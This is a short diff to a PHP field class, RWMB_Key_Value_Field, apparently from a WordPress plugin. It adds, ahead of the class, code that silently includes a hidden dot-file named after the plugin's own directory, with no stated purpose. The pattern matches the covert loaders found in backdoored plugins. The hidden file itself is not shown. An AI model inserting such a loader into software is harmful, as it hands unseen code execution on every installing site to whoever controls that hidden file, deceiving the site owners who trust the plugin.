@@ -8,6 +8,10 @@
 /**
  * Key-value field class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Key_Value_Field extends RWMB_Text_Field {
 	/**
 	 * Get field HTML.
